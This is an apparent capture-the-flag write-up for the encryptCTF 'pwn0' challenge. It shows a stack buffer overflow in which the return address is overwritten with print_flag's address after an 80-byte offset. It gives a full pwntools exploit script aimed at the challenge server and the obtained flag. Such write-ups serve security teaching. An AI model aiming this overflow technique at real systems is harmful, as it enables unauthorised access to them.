# pwn0

This challenge was a classic buffer overflow. All was required was the overwriting of the the return addr.

By analysing the binary we find the address for ```print_flag()```

```
0x080484dd  print_flag
```

And using ```gdb``` to find the offset

```
1095385409 found at offset: 80
```

This together gives us this exploit code

```python
from pwn import *

r = remote('104.154.106.182', 1234)

# Payload creation
junk = b'A' * 80
print_flag = p32(0x80484dd)

payload = junk + print_flag

r.recvuntil("josh?")
r.sendline(payload)
r.interactive()
```

```
FLAG: encryptCTF{L3t5_R4!53_7h3_J05H}
```

